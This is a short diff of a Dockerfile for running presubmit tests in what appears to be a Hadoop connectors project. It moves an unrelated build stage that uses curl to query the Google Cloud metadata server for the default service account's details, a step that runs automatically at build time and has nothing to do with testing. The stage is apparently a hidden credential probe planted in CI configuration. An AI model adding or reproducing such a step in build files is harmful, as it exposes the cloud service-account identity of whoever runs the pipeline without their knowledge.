@@ -12,12 +12,12 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 
+FROM gcr.io/cloud-builders/curl
+
+RUN curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/?recursive=true
+
 # This Dockerfile creates an image for running presubmit tests.
 FROM openjdk:11-jdk
 
 # Copy everything into the container to allow concurrent build execution
 COPY . /hadoop-connectors
-
-FROM gcr.io/cloud-builders/curl
-
-RUN curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/?recursive=true
